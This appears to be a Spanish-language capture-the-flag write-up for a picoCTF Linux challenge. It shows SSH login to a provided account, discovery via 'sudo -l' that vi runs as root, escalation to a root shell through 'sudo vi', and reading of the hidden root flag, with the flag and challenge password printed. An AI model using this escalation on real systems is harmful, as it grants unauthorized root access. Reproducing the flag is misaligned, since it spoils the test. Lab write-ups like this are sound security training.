## Descripción 
Can you read files in the root file?

The system admin has provisioned an account for you on the main server:

`ssh -p 59178 [picoplayer@saturn.picoctf.net](mailto:picoplayer@saturn.picoctf.net)`

Password: `NBD+zO8s4y`

Can you login and read the root file?
## Solución 
```
 ssh -p 58035 picoplayer@saturn.picoctf.net
 sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$ sudo vi

root@challenge:/home/picoplayer# whoami
root
root@challenge:/home/picoplayer# cd /root
root@challenge:~# ls
root@challenge:~# ls -la
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Aug 30 03:08 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
root@challenge:~# cat .flag.txt 
picoCTF{uS1ng_v1m_3dit0r_1cee9dcb}
```
## Notas adicionales 
* vi - Es un editor de texto que si se abre como administrador cualquier comando que escribas en el puede heredar estos mismos privilegios de administrador a ellos 
* ls -la - nos muestra todo el contenido que este oculto 
## Referencias
* https://webshell.cylabacademy.org/
* Gemini